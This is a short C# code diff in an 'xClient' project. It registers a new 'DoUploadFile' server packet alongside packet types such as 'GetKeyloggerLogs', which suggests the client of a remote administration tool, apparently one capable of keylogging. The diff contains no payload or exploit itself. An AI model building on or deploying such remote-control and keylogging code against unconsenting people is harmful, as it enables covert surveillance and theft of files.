@@ -81,6 +81,7 @@ namespace xClient
                 typeof (Core.Packets.ServerPackets.DoStartupItemRemove),
                 typeof (Core.Packets.ServerPackets.DoDownloadFileCancel),
                 typeof (Core.Packets.ServerPackets.GetKeyloggerLogs),
+                typeof (Core.Packets.ServerPackets.DoUploadFile),
                 typeof (Core.Packets.ClientPackets.GetAuthenticationResponse),
                 typeof (Core.Packets.ClientPackets.SetStatus),
                 typeof (Core.Packets.ClientPackets.SetUserStatus),
